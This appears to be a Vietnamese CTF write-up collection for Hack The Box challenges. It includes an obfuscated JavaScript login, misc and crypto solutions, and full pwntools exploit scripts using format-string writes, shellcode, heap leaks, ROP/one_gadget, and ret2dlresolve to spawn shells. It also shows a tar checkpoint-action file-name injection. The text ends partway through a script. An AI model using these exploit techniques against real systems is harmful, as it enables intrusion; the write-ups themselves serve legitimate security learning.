var _0x4e0b=['\x74\x6f\x53\x74\x72\x69\x6e\x67','\x75\x73\x65\x72\x6e\x61\x6d\x65','\x63\x6f\x6e\x73\x6f\x6c\x65','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x6c\x6f\x67','\x62\x69\x6e\x64','\x64\x69\x73\x61\x62\x6c\x65\x64','\x61\x70\x70\x6c\x79','\x61\x64\x6d\x69\x6e','\x70\x72\x6f\x74\x6f\x74\x79\x70\x65','\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28\x20\x29','\x20\x61\x74\x74\x65\x6d\x70\x74\x3b','\x76\x61\x6c\x75\x65','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72','\x59\x6f\x75\x20\x68\x61\x76\x65\x20\x6c\x65\x66\x74\x20','\x74\x72\x61\x63\x65','\x72\x65\x74\x75\x72\x6e\x20\x2f\x22\x20\x2b\x20\x74\x68\x69\x73\x20\x2b\x20\x22\x2f','\x74\x61\x62\x6c\x65','\x6c\x65\x6e\x67\x74\x68','\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f','\x65\x72\x72\x6f\x72','\x4c\x6f\x67\x69\x6e\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79'];(function(_0x173c04,_0x4e0b6e){var _0x20fedb=function(_0x2548ec){while(--_0x2548ec){_0x173c04['\x70\x75\x73\x68'](_0x173c04['\x73\x68\x69\x66\x74']());}},_0x544f36=function(){var _0x4c641a={'\x64\x61\x74\x61':{'\x6b\x65\x79':'\x63\x6f\x6f\x6b\x69\x65','\x76\x61\x6c\x75\x65':'\x74\x69\x6d\x65\x6f\x75\x74'},'\x73\x65\x74\x43\x6f\x6f\x6b\x69\x65':function(_0x35c856,_0x13e7c5,_0x58186,_0xf5e7a4){_0xf5e7a4=_0xf5e7a4||{};var _0x120843=_0x13e7c5+'\x3d'+_0x58186,_0x3f3096=0x0;for(var _0x159a78=0x0,_0x1307a5=_0x35c856['\x6c\x65\x6e\x67\x74\x68'];_0x159a78<_0x1307a5;_0x159a78++){var _0x2316f9=_0x35c856[_0x159a78];_0x120843+='\x3b\x20'+_0x2316f9;var _0x22cb86=_0x35c856[_0x2316f9];_0x35c856['\x70\x75\x73\x68'](_0x22cb86),_0x1307a5=_0x35c856['\x6c\x65\x6e\x67\x74\x68'],_0x22cb86!==!![]&&(_0x120843+='\x3d'+_0x22cb86);}_0xf5e7a4['\x63\x6f\x6f\x6b\x69\x65']=_0x120843;},'\x72\x65\x6d\x6f\x76\x65\x43\x6f\x6f\x6b\x69\x65':function(){return'\x64\x65\x76';},'\x67\x65\x74\x43\x6f\x6f\x6b\x69\x65':function(_0x589958,_0x2bfede){_0x589958=_0x589958||function(_0x168695){return _0x168695;};var _0x4b3aae=_0x589958(new RegExp('\x28\x3f\x3a\x5e\x7c\x3b\x20\x29'+_0x2bfede['\x72\x65\x70\x6c\x61\x63\x65'](/([.$?*|{}()[]\/+^])/g,'\x24\x31')+'\x3d\x28\x5b\x5e\x3b\x5d\x2a\x29')),_0x43e750=function(_0x387366,_0x8c72e7){_0x387366(++_0x8c72e7);};return _0x43e750(_0x20fedb,_0x4e0b6e),_0x4b3aae?decodeURIComponent(_0x4b3aae[0x1]):undefined;}},_0x1d30b3=function(){var _0x23ed4e=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return _0x23ed4e['\x74\x65\x73\x74'](_0x4c641a['\x72\x65\x6d\x6f\x76\x65\x43\x6f\x6f\x6b\x69\x65']['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};_0x4c641a['\x75\x70\x64\x61\x74\x65\x43\x6f\x6f\x6b\x69\x65']=_0x1d30b3;var _0x488f18='';var _0x4ac08e=_0x4c641a['\x75\x70\x64\x61\x74\x65\x43\x6f\x6f\x6b\x69\x65']();if(!_0x4ac08e)_0x4c641a['\x73\x65\x74\x43\x6f\x6f\x6b\x69\x65'](['\x2a'],'\x63\x6f\x75\x6e\x74\x65\x72',0x1);else _0x4ac08e?_0x488f18=_0x4c641a['\x67\x65\x74\x43\x6f\x6f\x6b\x69\x65'](null,'\x63\x6f\x75\x6e\x74\x65\x72'):_0x4c641a['\x72\x65\x6d\x6f\x76\x65\x43\x6f\x6f\x6b\x69\x65']();};_0x544f36();}(_0x4e0b,0x182));var _0x20fe=function(_0x173c04,_0x4e0b6e){_0x173c04=_0x173c04-0x0;var _0x20fedb=_0x4e0b[_0x173c04];return _0x20fedb;};var _0x35c856=function(){var _0x58186=!![];return function(_0xf5e7a4,_0x120843){var _0x3f3096=_0x58186?function(){var _0x228e0e=_0x20fe;if(_0x120843){var _0x159a78=_0x120843[_0x228e0e('\x30\x78\x31\x31')](_0xf5e7a4,arguments);return _0x120843=null,_0x159a78;}}:function(){};return _0x58186=![],_0x3f3096;};}(),_0x4ac08e=_0x35c856(this,function(){var _0x1307a5=function(){var _0x257462=_0x20fe,_0x2316f9=_0x1307a5[_0x257462('\x30\x78\x31')](_0x257462('\x30\x78\x34'))()[_0x257462('\x30\x78\x31')]('\x5e\x28\x5b\x5e\x20\x5d\x2b\x28\x20\x2b\x5b\x5e\x20\x5d\x2b\x29\x2b\x29\x2b\x5b\x5e\x20\x5d\x7d');return!_0x2316f9['\x74\x65\x73\x74'](_0x4ac08e);};return _0x1307a5();});_0x4ac08e();var _0x4c641a=function(){var _0x22cb86=!![];return function(_0x589958,_0x2bfede){var _0x4b3aae=_0x22cb86?function(){var _0x13eb7f=_0x20fe;if(_0x2bfede){var _0x43e750=_0x2bfede[_0x13eb7f('\x30\x78\x31\x31')](_0x589958,arguments);return _0x2bfede=null,_0x43e750;}}:function(){};return _0x22cb86=![],_0x4b3aae;};}(),_0x2548ec=_0x4c641a(this,function(){var _0x4cb6ce=_0x20fe,_0x168695;try{var _0x387366=Function('\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20'+_0x4cb6ce('\x30\x78\x31\x34')+'\x29\x3b');_0x168695=_0x387366();}catch(_0x57823f){_0x168695=window;}var _0x8c72e7=_0x168695[_0x4cb6ce('\x30\x78\x63')]=_0x168695[_0x4cb6ce('\x30\x78\x63')]||{},_0x23ed4e=[_0x4cb6ce('\x30\x78\x65'),'\x77\x61\x72\x6e','\x69\x6e\x66\x6f',_0x4cb6ce('\x30\x78\x38'),'\x65\x78\x63\x65\x70\x74\x69\x6f\x6e',_0x4cb6ce('\x30\x78\x35'),_0x4cb6ce('\x30\x78\x33')];for(var _0x3d84c2=0x0;_0x3d84c2<_0x23ed4e[_0x4cb6ce('\x30\x78\x36')];_0x3d84c2++){var _0x3aed9e=_0x4c641a[_0x4cb6ce('\x30\x78\x31')][_0x4cb6ce('\x30\x78\x31\x33')]['\x62\x69\x6e\x64'](_0x4c641a),_0x57c30b=_0x23ed4e[_0x3d84c2],_0x526aea=_0x8c72e7[_0x57c30b]||_0x3aed9e;_0x3aed9e[_0x4cb6ce('\x30\x78\x37')]=_0x4c641a[_0x4cb6ce('\x30\x78\x66')](_0x4c641a),_0x3aed9e['\x74\x6f\x53\x74\x72\x69\x6e\x67']=_0x526aea[_0x4cb6ce('\x30\x78\x61')][_0x4cb6ce('\x30\x78\x66')](_0x526aea),_0x8c72e7[_0x57c30b]=_0x3aed9e;}});_0x2548ec();var attempt=0x3;function validate(){var _0x4d1a17=_0x20fe,_0x32b344=document['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64']('\x75\x73\x65\x72\x6e\x61\x6d\x65')['\x76\x61\x6c\x75\x65'],_0x5997a2=document[_0x4d1a17('\x30\x78\x64')]('\x70\x61\x73\x73\x77\x6f\x72\x64')[_0x4d1a17('\x30\x78\x30')];if(_0x32b344==_0x4d1a17('\x30\x78\x31\x32')&&_0x5997a2==_0x4d1a17('\x30\x78\x31\x32'))return alert(_0x4d1a17('\x30\x78\x39')),window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']='\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x68\x74\x6d\x6c',![];else{attempt--,alert(_0x4d1a17('\x30\x78\x32')+attempt+_0x4d1a17('\x30\x78\x31\x35'));if(attempt==0x0)return document[_0x4d1a17('\x30\x78\x64')](_0x4d1a17('\x30\x78\x62'))['\x64\x69\x73\x61\x62\x6c\x65\x64']=!![],document[_0x4d1a17('\x30\x78\x64')]('\x70\x61\x73\x73\x77\x6f\x72\x64')[_0x4d1a17('\x30\x78\x31\x30')]=!![],document[_0x4d1a17('\x30\x78\x64')]('\x73\x75\x62\x6d\x69\x74')[_0x4d1a17('\x30\x78\x31\x30')]=!![],![];}}var res=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0x48,0x54,0x42,0x7b,0x57,0x33,0x4c,0x63,0x30,0x6d,0x33,0x5f,0x37,0x30,0x5f,0x4a,0x34,0x56,0x34,0x35,0x43,0x52,0x31,0x70,0x37,0x5f,0x64,0x33,0x30,0x62,0x46,0x75,0x35,0x43,0x34,0x37,0x31,0x30,0x4e,0x7d,0xa);

```

nhìn thì có vẻ bị mã hóa gọi là  JS Obsfucation


vào https://www.dcode.fr/javascript-unobfuscator để decode lại 

đọc đến cuối thì thấy 1 đoạn ascii khá lạ :v , đem decode thử 

![image](https://hackmd.io/_uploads/B1Hx36jZkx.png)


bump :)))

![image](https://hackmd.io/_uploads/ByGZ3TsZkl.png)


--------



15 . The secret of a Queen (misc)
------

1 baì liên quan đến lịch sử ám sát gì đó của nữ hoàng a li da bét 1 , đơn giản là ta chỉ cần decrypt các kí tự đó ra thôi 

![image](https://hackmd.io/_uploads/rk5_EN3-yg.png)


dùng https://www.dcode.fr/mary-stuart-code

hoặc so sánh bằng hình ảnh

![image](https://hackmd.io/_uploads/B1L94V3WJg.png)

cuối cùng ta sẽ được 

HTB{THEBABINGTONPLOT}


------------------




16 . Space pirate (fsb basic)
---------

- 1 bài fmt basic 

hàm open_door là target ở đây , vậy chỉ cần thay đổi V5 thành 0xdead1337 là được , và nó cũng đang mang giá trị 0xdeadbeef nên ta chỉ cần ghi 2 byte

![image](https://hackmd.io/_uploads/S1FySohbJx.png)

1 điều chú ý nữa là địa chỉ trỏ tới thằng 0xdeadbeef được gán cho địa chỉ stack nên ta lấy offset đó để ghi luôn , nếu không thì ta sẽ kh có con trỏ để ghi :v

script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./sp_entrypoint_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = remote('94.237.63.224',50822)
#p = process()
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000D95
#           ''')
#input()
p.sendlineafter(b'> ',b'1')
payload = f"%{0x1337}c%7$hn".encode()
p.send(payload)


p.interactive()
```

flag : 

![image](https://hackmd.io/_uploads/ryxKdHohZ1g.png)

----------


17 . misDIRection (misc)
--------

1 bài misc làm mình khá nhức đầu (éo hiểu) =)))

sau khi tải về và unzip ta được thằng .secret chứa rất nhiều thư mục và các file , đại loại như sau : 

![image](https://hackmd.io/_uploads/SkQfg16-1x.png)


thằng 0 thì chứa 

![image](https://hackmd.io/_uploads/ry4Xxk6b1x.png)

thằng 1 chứa 

![image](https://hackmd.io/_uploads/HkmVeJTWJl.png)


hmmmmmm , mấy thằng khác cũng khá lộn xộn :>>>  

thử ls -LR ra thì thấy như thế này , ta sẽ thử sắp xếp thứ tự xem sao

![image](https://hackmd.io/_uploads/Sk0IeJaWkl.png)

- sau khi sắp xếp thứ tự chuỗi này SFRCe0RJUjNjdEx5XzFuX1BsNDFuX1NpN2V9 , và có lẽ nó bị mã hóa , check xem có thể là base64 không bằng cách chia nó cho 4 , mà thôi có lẽ là nó nên ta decode luôn =)))

good chóp

![image](https://hackmd.io/_uploads/Hyy1Z1pZke.png)


đây là đoạn script tự động , chạy với ./solve.py | base64 -d
```
#!/usr/bin/env python3
import os
def search(idx):
 i = str(idx)
 for directory in os.listdir():
 os.chdir(directory)
 for subdir in os.listdir():
 if subdir == idx:
 os.chdir('..')
 return directory # found
 os.chdir('..')
 return None # not found
if __name__ == '__main__':
 os.chdir('./.secret') # cd to .secret
 cnt = 1 # index to search for
 letter = ''
 while 1:
 letter = search(cnt) # directory that cnt was found in
 if letter is None: break
 print(letter, end='') # print with no \n at the end
 cnt += 1
```
------

----

Blacksmith (shellcode)


--------

1 bài thử thách khả năng viết shellcode nữa :)))


- à source code hơi loằng ngoằng nên đi thẳng vào vấn đề chính luôn là bài này nó yêu cầu ta open ,read , write thôi

![image](https://hackmd.io/_uploads/HkWlylaZke.png)



viết script luôn :)

```

#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./blacksmith',checksec=False)

#p = process()
p = remote('83.136.250.158',52394)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000dd4
#           brva 0x0000000000000de2
#           ''')

shellcode = asm('''
    push 29816
    mov r9,0x742e67616c662f2e
    push r9
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    mov al,0x02
    syscall

    mov rdi,rax
    mov rsi,rsp
    sub rsi,0x50
    mov rdx,0x50
    mov al,0
    syscall

    mov rdi,1
    mov al,1
    syscall
    ''',arch='amd64')
pwn_tools = shellcraft.open('./flag.txt')
pwn_tools += shellcraft.read(3,'rsp',100)
pwn_tools += shellcraft.write(1,'rsp',100)
print(len(shellcode))
input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'2')
#p.sendlineafter(b'> ',shellcode)
p.sendlineafter(b'> ',asm(pwn_tools))





p.interactive()
```

ở trên là shellcode orw bằng tay và dùng tool luôn :>> , pwntools mãi dịu 

![image](https://hackmd.io/_uploads/SkLJlxpbJx.png)

---------



18 . Zombienator (HEAP + BOF)
--------

1 bài heap trộn với BOF 

- create() :

![image](https://hackmd.io/_uploads/BJh8IGpWyl.png)
ta thấy nó cho nhập 1 size từ 0 -> 0x82 , hmmm 0x82 là vượt qua cả fastbin(0x80)  ròi

và idx <=9 , có OOB ở đây tuy nhiên thì bài này hình như sẽ kh khai thác


coppy chuỗi Zombienator ready! vào chunk+idx



- removez : 

chỉ nhập idx và free , có UAF ở đây 
![image](https://hackmd.io/_uploads/HyG28Gpb1g.png)






- display :

in dữ liệu của từng chunk ra 

![image](https://hackmd.io/_uploads/BJ4ePMTWyx.png)

- attack : 

cho ta nhập 1 số tùy ý , và dùng số đó trong loop , vd nhập 100 thì ta dc nhập vào stack 100 lần , cần để ý đến scanf("lf") , ta có thể dùng b'.'  để bypass canary 
![image](https://hackmd.io/_uploads/Hy9MDM6-ke.png)



- hmmmmm bài này có lẽ khó ở đoạn libc vì libc 2.35 nên mất csu rồi 

![image](https://hackmd.io/_uploads/SkrKPGpbJx.png)

- tuy nhiên lại liên quan đến heap nên ta có thể leak bằng double free hoặc dùng UBIN để leak libc vì khi free thì UBIN sẽ chứa địa chỉ libc

- ta sẽ được malloc 10 lần và size đối đa là 0x82 , tcache chỉ chứa dc 7 -> dư 3 , nên ta sẽ malloc 7 và thêm 1 nữa , xong free hết là có thể lấy được libc , còn lại thì trigger cái %ld  và ret2libc bình thường , mình dùng one_gadget và ret2libc ở script 

script : 


```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./zombienator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.63.224',52944)
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000193D
#           ''')

#input()
def create(size,idx):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b"Zombienator's tier: ",size)
    p.sendlineafter(b'Front line (0-4) or Back line (5-9): ',idx)


def free_(idx):
    p.sendlineafter(b'>> ',b'2')
    p.sendlineafter(b"Zombienator's position: ",idx)

def display():
    p.sendlineafter(b'>> ',b'3')


for i in range(10):
    create(b'130',str(i).encode())
#input()
for i in range(10):
    free_(str(i).encode())
display()
p.recvuntil(b'[7]: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))

libc.address = leak - 0x219ce0
log.info(f"libc: {hex(libc.address)}")

one_gadget = libc.address + 0xebc85

payload = str(struct.unpack('d', p64(1))[0]).encode()
def fmt(payload):
    p.sendlineafter(b'Enter coordinates: ',str(struct.unpack('d', p64(payload))[0]))
p.sendlineafter(b'>> ',b'4')
p.sendlineafter(b'Number of attacks: ',b'36')
pop_rdi = libc.address + 0x000000000002a3e5
one_gadget = libc.address + 0xebc88
for i in range(35):
    p.sendlineafter(b'Enter coordinates: ',b'.')
input()

fmt(one_gadget)


#fmt(pop_rdi)
#fmt(next(libc.search(b'/bin/sh\x00')))
#fmt(pop_rdi+1)
#fmt(libc.sym.system)


p.interactive()
```

- còn 1 vấn đề nữa là vì trong attack nó đóng stdeer , sdout , tuy nhiên chưq đóng stdin nên vẫn có thể lấy flag dc :v  , ở đây ta có thể dùng 

```exec 1>&0 , cat flag*>&0``` ...... , nói chung lệnh đó là khiến 2 thằng thực thi dc chung 1 luồng

tham khảo : 

https://www.kn0sky.com/?p=c8a11e1a-8875-4ff0-966a-f27b6c1a21e6

https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/


--------



19 . Micro Storage (misc)
-------


nc tới thì dc các option sau : 



![image](https://hackmd.io/_uploads/HJsJ6Lkzkx.png)

- sau khi dùng option 1 các kiểu và thử thằng 5 thì sẽ ra 1 đoạn base64 gì đó 

![image](https://hackmd.io/_uploads/SyPV68kzyl.png)


decode thử thì thấy dc 1 số thông tin , có lẽ là thông tin về file đồ với các quyền 644 , user và group 

![image](https://hackmd.io/_uploads/rkgIaUyMyg.png)


- hmmm , hôm trước cũng làm 1 bài dạng nén nén kiểu này , liệu có leo thang đặc quyền ở đây được không :v

- file giới hạn 32 kí tự , và cũng kh dc xài mấy cái kí tự đặc biệt ~ ` ! @ # $ % ^ & * ( ....



- ta check thử thì thấy
 ![image](https://hackmd.io/_uploads/HJuSAUkfJx.png)

vậy ý tưởng là sẽ tạo 3 file , 1 file --checkpoint=1 , 1 file , --checkpoint-action=exec=sh a.sh  là vì giới hạn kí tự nên cần đặt tên ngắn , với 1 file a.sh với nội dung như sau 

```
#!/bin/bash

cat /flag.txt
```


bump 


![image](https://hackmd.io/_uploads/Bkjn1DyfJx.png)


-------


20 . RFlag (hardware)
------


tải về thì thấy file này 

![image](https://hackmd.io/_uploads/SJ_1M91Gkg.png)


cf32 là tệp dữ liệu lưu trữ thông tin tín hiệu được thu thập bởi một đài phát thanh được xác định bằng phần mềm

- ta sẽ cần 1 số tool để phân tích file này  

ta có thể sử dụng 

- inspectrum  hoặc rtl_433

vô insectrum thì có lẽ nó phân tích tín hiệu nhiều hơn  , nên ta sẽ đổi qua rtl_433


![image](https://hackmd.io/_uploads/rJSWQ51z1e.png)


- có khá nhiều option 

![image](https://hackmd.io/_uploads/H1LBX9kzke.png)

- ta sẽ xài option -A


![image](https://hackmd.io/_uploads/H1MvX5yf1l.png)

- ở đoạn cuối ta tháy 1 chuỗi lạ lạ nhìn có vẽ giống hex nên lên cyberchef decode thì ra luôn :v 

![image](https://hackmd.io/_uploads/BkDKX9yMke.png)


đọc  từ ông nào đó 

![image](https://hackmd.io/_uploads/H1sVV9JG1e.png)


---------



21 . Signals (hardware)
--------


- cùng đến với 1 bài hardware nữa :v  , lần này ta được cho tệp wav 

mở lên nghe khá là chói tai :)))) , thử tải ```Audacity``` về thì chưa phân tích dc gì vì nghĩ là nó sẽ thuộc dạng mã hóa bằng âm thanh , Audacity   là một tool xem âm thanh dưới dạng sóng, nhưng không có gì.

![image](https://hackmd.io/_uploads/H1Uk9ckGkl.png)


sau đó cần chú ý lại desc : 
```
Some amateur radio hackers captured a strange signal from space. A first analysis indicates similarities with signals transmitted by the ISS. Can you decode the signal and get the information?
```

Một số hacker vô tuyến nghiệp dư đã bắt được tín hiệu lạ từ không gian. Phân tích đầu tiên chỉ ra những điểm tương đồng với tín hiệu do ISS truyền đi. Bạn có thể giải mã tín hiệu và lấy thông tin không?

![image](https://hackmd.io/_uploads/r1E5sqkfyx.png)


:v  , vì vậy ta sẽ thử xài tool khác xem sao , 


--------


22 . BabyEncryption (Crypto)
--------

-  vì ngu crypto nên mình quyết định làm bài cơ bản về crypto ....


ta dc cho 2 file 
![image](https://hackmd.io/_uploads/ryVY6jJfJg.png)

1 file python va 1 file sau khi mã hóa 

![image](https://hackmd.io/_uploads/HkoqajkfJg.png)


- đọc file python thì ta thấy nó sẽ lấy từng char trong msg , xong nhân với 123 + 18 và %256(để tránh vượt range ascii) , ta có thể thấy những kí tự in được trong mã ascii là từ 33 đến 126 nên ta sẽ thử brute force , ý tưởng là sẽ duyệt từ 33 đến 126 nếu kết quả của phép tính là byte sau khi đã mã hóa thì ta sẽ chuyển nó về char , tiếp tục cho đến hết chuỗi đã mã hóa 

script 

```
#!/usr/bin/python3

import os

os.system('clear')

f = open('./msg.enc','r')

plain_text = ''

secret = f.read()
print(f"cipher: {secret}")
cipher = bytes.fromhex(secret)
print("")
print(f"after change to bytes {cipher}")

for i in cipher:
    for brute in range(33,126):
        if((123*brute+18)%256) == i:
            plain_text += chr(brute)
            break
print("after decode")
print(plain_text)

```

good chop

![image](https://hackmd.io/_uploads/H1m21h1Myl.png)

--------

23 . pwnshop  (dùng gadget để tăng payload được sử dụng)
-------

- 1 bài nói về dùng 1 gadget để tăng payload khá hay , còn lại chỉ là ret2libc thôi 

có 2 hàm chính ở bài này 

option2  : 

để ý ở đoạn strcmp , nếu cái ta nhập vào là 13.37 thì nó sẽ dùng print("%s") để in , và khi debug thì ta thấy chỉ cần nhập 8 byte là sẽ leak được exe 

![image](https://hackmd.io/_uploads/SySQgh1fke.png)

option1 : ta có thể ovflow rip 


![image](https://hackmd.io/_uploads/rkGPl2kz1e.png)


ở bài này , đầu tiên ta có thể leak exe tuy nhiên khi thấy option 1 chỉ ghi đè đc mỗi RIP và không có hàm win , tuy nhiên ta có full gadget pop , vấn đề sẽ là thiếu khoảng trống để cho các gadget đó vào 

- à còn 1 điểm là mình éo hiểu tại sao cái ropper kiếm kh ra cái gadget hữu ích này :v 

- ý tưởng là ta sẽ dùng gadget sub ```rsp ; ret``` để ta có thể điều khiển luồng thực thi đó 

payload của ta sẽ có dạng như sau , 0x48 sẽ là ovRBP , 0x50 là RIP sẽ là gadget đó , muốn leak được thì sẽ cần poprdi,got,plt,và 1 hàm quay về main để get_shell là 0x20 byte , 0x48-0x20 là 0x28

```
'a'*0x28
pop_rdi
got của 1 hàm nào đó
plt puts
main (ở đây sẽ quay về thằng đang exploit luôn)
RIP (sẽ là gadget sub rsp)
```

![image](https://hackmd.io/_uploads/rJuM-21GJg.png)

- sau khi sub rsp , thì nó sẽ trỏ ngay pop của ta và lúc đó ta leak được libc , leak xong thì ret2libc như bth , ở đây ta cũng cần phải tìm libc giống với sever 


script 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./pwnshop_patched',checksec=False)
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.23.so')
#p = process()
p = remote('83.136.254.158',36331)

p.sendlineafter(b'> ',b'2')
p.sendafter(b'? ',b'aaa')
payload = b'a'*8
p.sendafter(b'? ',payload)
p.recvuntil(b'What? ')
p.recv(8)

leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f"leak {hex(leak)}")


exe.address = leak - 0x40c0
sub_rsp = 0x0000000000001219
pop_rdi = 0x00000000000013c3

log.info(f"exe: {hex(exe.address)}")

p.sendlineafter(b'> ',b'1')
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000135B
#           ''')
#input()

payload_leak = p64(pop_rdi+exe.address)
payload_leak += p64(exe.got.puts)
payload_leak += p64(exe.plt.puts)
payload_leak += p64(0x000000000000132A+exe.address)

p.sendafter(b'Enter details: ',b'a'*0x28 +  payload_leak + p64(exe.address + sub_rsp))

leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f"leak {hex(leak)}")
libc.address = leak - libc.sym.puts

log.info(f"lb: {hex(libc.address)}")


payload_get_shell = b'a'*0x28 + p64(pop_rdi+exe.address)
payload_get_shell += p64(next(libc.search(b'/bin/sh\x00')))
payload_get_shell += p64(pop_rdi+exe.address+1)
payload_get_shell += p64(libc.sym.system)
payload_get_shell += p64(sub_rsp + exe.address)
input()
p.sendafter(b'Enter details: ',payload_get_shell)

p.interactive()
```


-------

24 . Lesson (basic pwn)
------

- bài này chỉ hỏi cái cơ bản nên bỏ qua 


--------


25 . FlagCasino (rev)
-----

- bài này liên quan đến hàm srand() trong C 


ta thấy được nó sẽ có 1 vòng lặp 30 lần , nó lấy kí tự mà ta nhập vào làm seed cho srand()  , xong nó check xem số dc tạo ngẫu nhiên đó có bằng check[i] không 

```
rand()là một trình tạo số ngẫu nhiên có thể dự đoán được—gọi srand(x)theo sau rand()sẽ luôn tạo ra cùng một kết quả cho một hạt giống nhất định.
```
![image](https://hackmd.io/_uploads/ry_U1C1G1e.png)


check[i] sẽ là cái mớ này

![image](https://hackmd.io/_uploads/r1Xel0JMyg.png)


vậy ý tưởng của ta sẽ là , vì Format Specifiers của ta sẽ là %c nên ta có thể giới hạn nó từ 1-256 , vậy ta sẽ tạo 1 dic trong python để giữ giá trị của rand() , tiếp theo là lấy từng giá trị trong check , xong sẽ lấy giá trị để truy xuất cái input

ta có thể code C hoặc python , trong python  có thư viện ctypes hỗ trợ


script sẽ như sau : 


```
#!/usr/bin/python3

from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')
context.binary = exe = ELF('./casino',checksec=False)


flag = ''
map_hehe = {}
for i in range(1,256):
        libc.srand(i)
        map_hehe[libc.srand()] = chr(i)

for i in range(30):
        value = exe.u32(exe.sym.check + i * 4)
        flag += map_hehe[value]
print(flag)
```

done 

![image](https://hackmd.io/_uploads/Sym1N01GJx.png)


---------

26 . Void  (ret2dlresolve )
---------

- 1 bài ret2dlresolve , tuy nhiên vẫn có thể làm theo 1 cách khác 

- ở đây ta thấy nó chỉ có mỗi read nên sẽ không leak được gì khác 


![image](https://hackmd.io/_uploads/rkkItOxMyl.png)


script 1 : 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./void',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

p = process()
#p = remote('83.136.254.158',46348)

# gdb.attach(p,gdbscript='''
#       b*vuln+25
#       b*vuln+32
#       c
#       ''')
# input()

csu = 0x004011b2
off_to_og = 0xc961a - libc.sym['read'] #one_gadget - read
add = 0x0000000000401108 #add

payload = b'a'*64 + b'b'*8
payload += p64(csu)
payload += p64(off_to_og, sign=True) #pop rbx
payload += p64(exe.got['read']+0x3d) #pop rbp (plus 0x3d because gadget add)
payload += p64(0)*4 #pop r12 r13 r14 r15
payload += p64(add) #gadget add
payload += p64(exe.sym['read'])
p.send(payload)

p.interactive()
#HTB{r3s0lv3_th3_d4rkn355}
```


script 2 : 


```
from pwn import *

context.binary = exe = ELF('./void',checksec=False)

#p = process(exe.path)
p = remote('83.136.254.158',46348)

dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh\0'])
rop = ROP(exe)
rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

pl = b'a'*72 + raw_rop

p.send(pl)

#sleep(1)
input()

p.send(dlresolve.payload)

p.interactive()
#HTB{r3s0lv3_th3_d4rkn355}
```


script 3 : 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./void',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*vuln+25
                b*vuln+32
                c
                ''')
                input()

if args.REMOTE:
        p = remote('178.62.9.10',31314)
else:
        p = process(exe.path)

leave_ret = 0x0000000000401141
pop_rbp = 0x0000000000401109
pop_rdi = 0x00000000004011bb
pop_rsi_r15 = 0x00000000004011b9
rw_section = 0x404a00

# GDB()

#stack pivot
payload = b"a"*64
payload += p64(rw_section)
payload += p64(pop_rsi_r15) + p64(rw_section) + p64(0)
payload += p64(exe.plt['read'])
payload += p64(leave_ret)

p.send(payload)

JMPREL = 0x400430
SYMTAB = 0x400330
STRTAB = 0x400390
link_map = 0x0000000000401020

SYMTAB_addr = 0x404a40
JMPREL_addr = 0x404a68
STRTAB_addr = 0x404a78

symbol_number = int((SYMTAB_addr - SYMTAB)/24)
reloc_arg = int((JMPREL_addr - JMPREL)/24)
st_name = STRTAB_addr - STRTAB

log.info("symbol_number: " + hex(symbol_number))
log.info("reloc_arg: " + hex(reloc_arg))
log.info("st_name: " + hex(st_name))

st_info = 0x12
st_other = 0
st_shndx = 0
st_value = 0
st_size = 0

SYMTAB_struct = p32(st_name) #0x404a40
SYMTAB_struct += p8(st_info)
SYMTAB_struct += p8(st_other)
SYMTAB_struct += p16(st_shndx)
SYMTAB_struct += p64(st_value) #0x404a48
SYMTAB_struct += p64(st_size) #0x404a50

r_offset = exe.got['read']
r_info = (symbol_number << 32) | 7
r_addend = 0
JMPREL_struct = p64(r_offset) #0x404a68
JMPREL_struct += p64(r_info) #0x404a70

payload = flat(
    b'A'*8,        #a00 #padding
    pop_rsi_r15,   #a08
    0, 0,          #a10 #a18
    pop_rdi,       #a20
    0x404a80,      #a28 #string /bin/sh
    link_map,      #a30 #link_map
    reloc_arg,     #a38 #reloc_arg
